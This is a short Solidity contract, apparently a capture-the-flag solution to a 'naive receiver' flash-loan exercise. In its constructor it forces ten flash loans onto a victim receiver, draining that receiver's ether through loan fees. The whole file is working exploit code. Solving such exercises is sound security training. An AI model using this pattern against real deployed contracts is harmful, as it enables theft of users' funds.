// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveRecieverAttack {
    constructor(NaiveReceiverLenderPool pool, address receiver) {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, 1 ether);
        }
    }
}
